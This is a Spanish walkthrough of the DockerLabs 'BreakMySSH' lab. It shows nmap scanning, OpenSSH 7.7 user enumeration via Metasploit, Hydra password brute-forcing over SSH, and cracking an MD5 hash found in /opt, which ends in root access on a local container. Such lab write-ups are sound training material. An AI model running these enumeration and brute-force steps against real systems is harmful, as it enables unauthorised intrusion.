# BREAKMYSSH 
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.17.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Mon Sep  8 15:38:35 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///  Ignored State: closed (65534)
   5   │ # Nmap done at Mon Sep  8 15:38:37 2025 -- 1 IP address (1 host up) scanned in 2.37 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22 -sCV 172.17.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Mon Sep  8 15:39:37 2025 as: /usr/lib/nmap/nmap --privileged -p22 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
   9   │ |   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
  10   │ |_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
  11   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  12   │ 
  13   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  14   │ # Nmap done at Mon Sep  8 15:39:37 2025 -- 1 IP address (1 host up) scanned in 0.95 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Como la versión del servicio OpenSSH es menor o igual a la 7.7 sabemos que puede haber vulnerabilidades conocidas. Esto es algo que acabas aprendiendo de memoria pero, si queremos comprobarlo podemos hacer uso de la herramienta [searchsploit](https://github.com/topics/searchsploit) para ver si presenta o no alguna vulnerabilidad.
```ruby
❯ searchsploit OpenSSH 7.7
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                             | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                       | linux/remote/45939.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Podemos observar que, efectivamente, hay un par de vulnerabilidades conocidas.  Aquí puedes tomar dos caminos.
1. Utilizar alguna base de datos de CVEs para buscar algún script que poder ejecutar para explotarla.
2. Utilizar metasploit.

Yo decidí utilizar [metasploit](https://github.com/rapid7/metasploit-framework) en este caso añadiendo el parámetro -q para evitar el banner de inicio de la herramienta y así ganar más tiempo.
```ruby
❯ msfconsole -q
msf > use auxiliary/scanner/ssh/ssh_enumusers
[*] Setting default action Malformed Packet - view all 2 actions with the show actions command
msf auxiliary(scanner/ssh/ssh_enumusers) > show options 

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   true             no        Check for false positives (random username)
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         22               yes       The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                       no        Single username to test (username spray)
   USER_FILE                      no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet



View the full module info with the info, or info -d command.

msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 172.17.0.2
RHOST => 172.17.0.2
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
USER_FILE => /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'man' found
[+] 172.17.0.2:22 - SSH - User 'bin' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'nobody' found
[+] 172.17.0.2:22 - SSH - User 'lovely' found
[+] 172.17.0.2:22 - SSH - User 'backup' found
[+] 172.17.0.2:22 - SSH - User 'daemon' found
[+] 172.17.0.2:22 - SSH - User 'proxy' found
[+] 172.17.0.2:22 - SSH - User 'list' found
[+] 172.17.0.2:22 - SSH - User 'sys' found
[+] Scanned 1 of 1 hosts (100% complete)
[+] Auxiliary module execution completed
```
Una vez acabada la ejecución podemos observar el posible usuario de sistema, *lovely*.  Para comprobar si estamos en lo cierto, haremos uso de la herramienta de fuerza bruta [Hydra](https://github.com/vanhauser-thc/thc-hydra) utilizando *lovely* como nombre de usuario y el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
```py
❯ hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 16:48:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: lovely   password: rockyou
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 16:49:05
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *lovely*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh lovely@172.17.0.2
lovely@172.17.0.2's password: 
Linux 99ebdb36daec 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
lovely@90f44a27e698:~$ whoami
lovely
``` 

Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
```ruby
lovely@90f44a27e698:~$ sudo -l
-bash: sudo: command not found
```
Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
* Tu usuario no tiene permisos para sudo, o sudo no está instalado.

La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
```ruby 
lovely@90f44a27e698:~$ find / -type f -perm -4000 2>/dev/null
/usr/local/libexec/ssh-keysign
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/bin/su
/bin/umount
/bin/ping
/bin/mount 
```
* Con find buscamos archivos y directorios en Linux.
* Con / indicamos desde la raíz del sistema (es decir, busca en todo el sistema de archivos).
* Con -type filtramos el tipo de archivo que queremos encontrar.
* f significa *file* (archivo regular).
* Con -perm filtramos por permisos específicos.
* El bit 4000 corresponde al bit SUID:
  * 4000 indica “ejecutar con los permisos del propietario”.
  * El - antes de 4000 significa que cualquier archivo que tenga este bit SUID activado será incluido, aunque tenga otros permisos también.
* Con 2>/dev/null conseguimos que la salida solo muestre los archivos válidos y no los errores.
  * 2 es el descriptor de error (stderr).
  * /dev/null es un archivo especial en Linux que descarta todo lo que se escriba en él.

En esta salida podemos ver que no encontramos ningún binario que nos pueda proporcionar un escalado de privilegios de forma sencilla, por lo que decido investigar por el sistema a ver si hay algún archivo o directorio que pueda contener algo de información. 
```ruby
lovely@90f44a27e698:~$ pwd
/home/lovely
lovely@90f44a27e698:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile
lovely@90f44a27e698:~$ cd ../..
lovely@90f44a27e698:/$ ls -a
.  ..  .dockerenv  bin  boot  dev  docker-entrypoint.sh  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
lovely@90f44a27e698:/$ ls -a /opt
.  ..  .hash
lovely@90f44a27e698:/$ cat opt/.hash
aa87ddc5b4c24406d26ddad771ef44b0
```
Trasteando un poco nos encontramos con un fichero oculto llamado *.hash*, el cual, si lo inspeccionamos, contendrá lo que parece un hash.  Lo copiamos y nos dirigiremos a la web de [CarckStation](https://crackstation.net/) y descrackemos el hash.  Como resultado nos dará que es un hash hecho con un algoritmo md5 y oculta la palabra *estrella*. ![CrackStation](https://github.com/JavieRR13/WriteUps/blob/2be3675a25197e4f1ce663fb2091422907aa2746/DockerLabs/Muy%20f%C3%A1cil/BreackMySSH/Im%C3%A1genes/BMSSH_CrackStation.png)
Ya con la contraseña guardada, utilizaremos [Hydra](https://github.com/vanhauser-thc/thc-hydra) pero esta vez para adivinar un posible usuario al que pertenezca dicha contraseña.  
```ruby
❯ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p estrella -f ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 21:37:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 21:37:25
```
* Con -L indicamos que el usuario se va a proporcionar por una lista.
* Con -p inidcamos la password.
* Con -f indicamos que finalice la ejecución una vez encuentre un parámetro válido.

Este proceso nos ha dado como resultado que la contraseña *estrella* puede pertenecer al usuario *root*.  Así que lo probamos y...
```ruby
❯ ssh root@172.17.0.2
root@172.17.0.2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@90f44a27e698:~# whoami
root
```
🥳CONSEGUIDO, SOMOS ROOT🥳
____________________________________________________________________________________________
Otra opcion válida pero mucho menos didáctica hubiera sido ejecutar [Hydra](https://github.com/vanhauser-thc/thc-hydra) directamente contra el usuario *root*, asumiendo que se llamaba así, sin necesidad de andar trasteando con el usuario *lovely*.
```ruby
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 21:48:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 21:48:28
```
